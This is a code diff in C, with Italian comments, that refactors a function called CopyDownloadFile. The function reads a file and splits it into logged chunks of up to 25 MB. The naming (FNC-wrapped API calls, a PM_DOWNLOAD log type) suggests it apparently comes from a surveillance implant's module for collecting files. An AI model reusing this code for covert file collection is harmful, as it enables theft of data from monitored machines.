@@ -133,13 +133,12 @@ BOOL ExploreDirectory(HANDLE hdest, WCHAR *start_path, DWORD depth)
 #define MAX_DOWNLOAD_CHUNK_SIZE (25*1024*1024)
 BOOL CopyDownloadFile(WCHAR *src_path, WCHAR *display_name)
 {
-	FileAdditionalData *download_adh;
+	FILE_DATA *download_adh;
 	BYTE *read_buffer;
 	WCHAR *log_file_name;
 	WCHAR chunk_file_name[MAX_PATH];
 	DWORD adh_len, chunk_count=1, chunk_size, total_chunk_count;
 	DWORD  file_len_lo, file_len_hi, dwRead;
-	HANDLE hdst, hsrc;
 
 	// Vede come si dovra' chiamare il file nel log
 	if (!src_path) 
@@ -149,13 +148,13 @@ BOOL CopyDownloadFile(WCHAR *src_path, WCHAR *display_name)
 		log_file_name = display_name;
 
 	// Apre il file e ne prende la dimensione
-	hsrc = FNC(CreateFileW)(src_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
-	if (hsrc == INVALID_HANDLE_VALUE)
+	HANDLE hSrc = FNC(CreateFileW)(src_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+	if (hSrc == INVALID_HANDLE_VALUE)
 		return FALSE;
 
-	file_len_lo = FNC(GetFileSize)(hsrc, &file_len_hi);
+	file_len_lo = FNC(GetFileSize)(hSrc, &file_len_hi);
 	if (file_len_lo==INVALID_FILE_SIZE || file_len_hi>0) {
-		CloseHandle(hsrc);
+		CloseHandle(hSrc);
 		return FALSE;
 	}
 	// Calcola quanti chunk occupera'
@@ -165,7 +164,7 @@ BOOL CopyDownloadFile(WCHAR *src_path, WCHAR *display_name)
 	// Alloca il buffer di lettura
 	read_buffer = (BYTE *)malloc(MAX_DOWNLOAD_CHUNK_SIZE);
 	if (!read_buffer) {
-		CloseHandle(hsrc);
+		CloseHandle(hSrc);
 		return FALSE;
 	}
 
@@ -185,31 +184,31 @@ BOOL CopyDownloadFile(WCHAR *src_path, WCHAR *display_name)
 		chunk_count++;
 
 		// Crea l'additional header
-		adh_len = sizeof(FileAdditionalData) + wcslen(chunk_file_name) * sizeof(WCHAR);
-		if ( !(download_adh = (FileAdditionalData *)malloc(adh_len)))
+		adh_len = sizeof(FILE_DATA) + wcslen(chunk_file_name) * sizeof(WCHAR);
+		if ( !(download_adh = (FILE_DATA *)malloc(adh_len)))
 			break;
 		download_adh->uVersion = LOG_FILE_VERSION;
 		download_adh->uFileNameLen = wcslen(chunk_file_name) * sizeof(WCHAR);
 		memcpy(download_adh+1, chunk_file_name, download_adh->uFileNameLen);
 
 		// Crea il file di log
-		hdst = Log_CreateFile(PM_DOWNLOAD, (BYTE *)download_adh, adh_len);
+		HANDLE hDst = Log_CreateFile(PM_DOWNLOAD, (BYTE *)download_adh, adh_len);
 		SAFE_FREE(download_adh);
 
 		// Legge e scrive il chunk
 		dwRead = 0;
-		if (!FNC(ReadFile)(hsrc, read_buffer, chunk_size, &dwRead, NULL) ) {
-			Log_CloseFile(hdst);
+		if (!FNC(ReadFile)(hSrc, read_buffer, chunk_size, &dwRead, NULL) ) {
+			Log_CloseFile(hDst);
 			break;
 		}
-		if (!Log_WriteFile(hdst, read_buffer, dwRead)) {
-			Log_CloseFile(hdst);
+		if (!Log_WriteFile(hDst, read_buffer, dwRead)) {
+			Log_CloseFile(hDst);
 			break;
 		}
-		Log_CloseFile(hdst);
+		Log_CloseFile(hDst);
 	} while(file_len_lo > 0);
 
 	SAFE_FREE(read_buffer);
-	CloseHandle(hsrc);
+	CloseHandle(hSrc);
 	return TRUE;
 }
